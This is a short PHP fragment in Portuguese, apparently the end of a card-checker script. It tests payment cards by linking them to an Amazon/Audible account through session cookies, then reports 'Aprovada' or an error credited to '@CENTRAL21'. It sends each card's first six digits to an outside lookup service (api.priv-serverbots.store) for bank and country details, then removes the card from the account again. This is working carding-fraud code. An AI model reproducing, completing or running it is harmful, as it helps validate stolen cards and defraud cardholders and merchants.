    die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@CENTRAL21</span><br>');

    
} else {

    removecardaudible($cookieamz);

    $bin = json_decode(file_get_contents("https://api.priv-serverbots.store/?api=bin&bin=".substr($cc , 0,6)), true);
    $infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");

    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Verifique seus cookies, ou tente remover todos os cartões da conta.</span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@CENTRAL21</span><br>');

}

?>